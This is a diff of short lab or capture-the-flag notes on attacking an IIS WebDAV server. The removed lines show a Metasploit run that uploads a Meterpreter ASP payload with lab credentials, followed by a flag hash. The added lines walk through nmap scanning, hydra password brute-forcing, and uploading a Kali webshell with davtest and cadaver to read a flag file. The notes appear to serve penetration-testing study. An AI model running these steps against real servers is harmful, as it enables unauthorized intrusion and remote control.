@@ -1,10 +1,14 @@
-
-    - msfconsole
-    - search iis upload
-    - use exploit/windows/iis/iid_webdav_upload_asp
-    - set HttpPassword password_123321
-    - set HttpUsername bob
-    - set RHOSTS 10.6.16.213
-    - set PATH /webdav/meterpreter.asp
-    - run
-    d3aff16a801b4b7d36b4da1094bee345
+- Practice : 
+    - nmap -sV -sC TARGET_IP
+    - nmap -sV -p 80 --script=http-enum TARGET_IP
+    - open in webbrowser
+        http://TARGET_IP/WEBDAV_DIR/
+    - hydra -L USERNAME_WORDLIST -P PASSWORD_WORDLIST TARGET_IP http-get /WEBDAV_DIR/
+    - davtest -url http://192.168.56.108/dav/ -auth vagrant:monkey
+    - cadaver  http://192.168.56.108/dav/
+        - this gives a shell
+        - kali already have some webshells in /usr/share/webshells
+        - put upload the file to the webdave directory
+        - put /usr/share/webshells/asp/webshell.asp
+    - dir C:\
+    - type C:\flag.txt
